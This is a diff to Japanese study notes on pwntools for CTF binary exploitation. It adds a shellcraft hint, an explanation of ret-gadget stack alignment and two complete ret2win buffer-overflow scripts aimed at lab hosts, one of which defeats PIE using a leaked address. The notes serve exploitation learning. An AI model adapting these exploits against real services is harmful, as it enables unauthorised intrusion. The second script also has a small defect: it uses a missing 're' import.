@@ -45,6 +45,8 @@ print(payload)
 
 ### shellcraft
 
+64ビットの場合、amd64.linux.execve
+
 ```shell
 # シェルコードのアセンブラ出力
 shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f a
@@ -102,10 +104,13 @@ print(connect.recvn(34))
 >>> from pwn import *
 
 # バイナリをロード
->>> binary = context.binary = ELF("./DearQA-1627223337406.DearQA")
+>>> binary = context.binary = ELF("./elf_file")
 
 # 関数のアドレス
 >>> hex(binary.symbols['vuln'])
+
+# retガジェット
+>>> ret_gadget = ROP(binary).find_gadget(['ret'])[0]
 ```
 
 ## 例
@@ -135,3 +140,88 @@ connect.interactive()
 ```
 
 上記の例で、binary と 2 か所の context は、コメントアウトしても機能する。
+
+### retガジェット
+
+64ビットOSで、RSPが16バイト境界にない場合、retガジェットが必要になる。
+
+RSP  0x7fffffffdcf8　のように、末尾が0出ない場合ずれている。
+
+```python
+from pwn import *
+
+# Set the binary context
+elf = context.binary = ELF('./tryretme')  # Replace with the actual binary name
+
+# Connect to the remote server
+p = remote('10.10.23.250', 9006)
+
+# Address of the win function
+win_addr = elf.symbols['win']
+
+# Address of a `ret` gadget (you can find this with tools like ROPgadget or Pwntools)
+# This gadget is simply one instruction: `ret`, which fixes stack alignment.
+ret_gadget = ROP(elf).find_gadget(['ret'])[0]
+
+# Offset (determined from cyclic_find)
+offset = 264
+
+# Payload: buffer + ret gadget + return address (win function)
+payload = b'A' * offset
+payload += p64(ret_gadget)  # Add the ret gadget to fix alignment
+payload += p64(win_addr)
+
+# Send the payload
+p.sendlineafter('Return to where? : ', payload)
+
+# Interact with the shell
+p.interactive()
+```
+
+### 受信したデータをペイロードに反映する
+
+TryPwnMeOne CTF 参照。
+
+```python
+#!/usr/bin/env pyhon3
+from pwn import *
+import sys
+
+host = "10.10.61.104"
+port = 9007
+
+vuln_addr = 0x1319
+win_addr = 0x1210
+ret_gadget = 0x101a
+
+context(os = "linux", arch = "amd64")
+connect = remote(host, port)
+
+# vuln関数アドレスを表示する行を受信するまで待つ
+while True:
+    line = connect.recvline().decode()
+    log.info(f"{line.strip()}")
+    if "I can give you a secret" in line:
+        break
+
+# アドレス部分（16進数）を抽出
+match = re.search(r"I can give you a secret ([0-9a-fA-F]+)", line)
+if match:
+    vuln_abs_addr = int(match.group(1), 16)
+    log.info(f"[+] vuln address: {hex(vuln_abs_addr)}")
+    offset = vuln_abs_addr - vuln_addr
+else:
+    log.error("vulnアドレスの抽出に失敗しました")
+    sys.exit(1)
+
+log.info("[+] Starting buffer Overflow")
+connect.recvuntil(b"Where are we going? : ")
+log.info("[+] Crafting payload")
+payload = b'A' * (256+8)
+
+payload += p64(offset + ret_gadget) # retガジェット
+payload += p64(offset + win_addr)
+log.info("[+] Sending Payload to the remote server")
+connect.sendline(payload)
+connect.interactive()
+```
